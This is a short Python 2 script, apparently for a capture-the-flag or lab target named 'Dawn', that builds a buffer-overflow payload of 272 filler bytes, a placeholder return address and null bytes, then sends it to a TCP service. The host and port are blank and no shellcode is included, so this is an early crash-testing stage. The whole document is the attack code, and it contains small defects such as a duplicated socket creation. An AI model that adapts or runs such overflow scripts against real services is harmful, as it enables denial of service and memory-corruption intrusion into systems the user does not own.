#!/usr/bin/python
import socket
import time

print "[*] Buffer Overflow Attack - for Dawn"
time.sleep(1)
print "[*] Setup the server address and port number"
time.sleep(1)
host = ""
port = ""


print "[*] Creating the buffer payload"
time.sleep(1)
null = "\x90\x00#"
offset = "\x42" * 4
crash = "\x41" * 272
mybuffer = crash + offset +null 



session = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

session = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*] Sending evil buffer..."
session.connect((host,port))
#print session.recv(1024)
print session
session.send(mybuffer)
session.close()
print "[*] Pyload sent!"
mybuffer = mybuffer+mybuffer
